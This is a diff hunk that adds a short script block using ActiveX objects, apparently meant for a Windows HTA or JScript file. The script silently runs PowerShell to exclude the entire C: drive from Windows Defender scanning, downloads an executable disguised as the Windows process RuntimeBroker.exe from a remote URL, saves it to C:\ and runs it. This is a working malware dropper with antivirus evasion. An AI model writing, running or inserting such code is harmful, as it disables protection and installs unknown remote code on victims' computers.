@@ -1,0 +1,15 @@
+<script>
+    var WshShell = new ActiveXObject("WScript.Shell");
+    WshShell.Run("powershell -Command Add-MpPreference -ExclusionPath 'C:\'", 0, true);
+    var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+    xmlHttp.open("GET", "https://github.com/huy32121/lol/raw/refs/heads/main/RuntimeBroker.exe", false);
+    xmlHttp.send();
+    var stream = new ActiveXObject("ADODB.Stream");
+    stream.Open();
+    stream.Type = 1;
+    stream.Write(xmlHttp.responseBody);
+    stream.Position = 0;
+    stream.SaveToFile("C:\\RuntimeBroker.exe", 2);
+    stream.Close();
+    WshShell.Run("C:\\RuntimeBroker.exe");
+</script>
